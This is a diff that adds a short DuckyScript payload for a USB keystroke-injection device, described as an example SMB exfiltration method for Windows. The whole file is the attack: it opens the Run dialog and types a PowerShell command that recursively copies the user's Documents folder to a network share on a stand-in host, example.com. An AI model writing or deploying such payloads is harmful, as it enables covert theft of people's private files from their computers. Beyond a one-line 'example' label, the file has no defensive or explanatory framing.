@@ -1,0 +1,14 @@
+REM Example Simple SMB Exfiltration Method for Windows
+
+REM Exilfitration Pattern Adapted from DuckyScript Quick Guide by Hak5, Code original
+
+DELAY 1000
+DEFINE exfil_path example.com\extraction-folder
+WINDOWS r
+DELAY 500
+STRING
+	powershell “Copy-Item -Recurse $env:USERPROFILE\Documents\* \\
+	exfil_path
+	”
+END_STRING
+ENTER
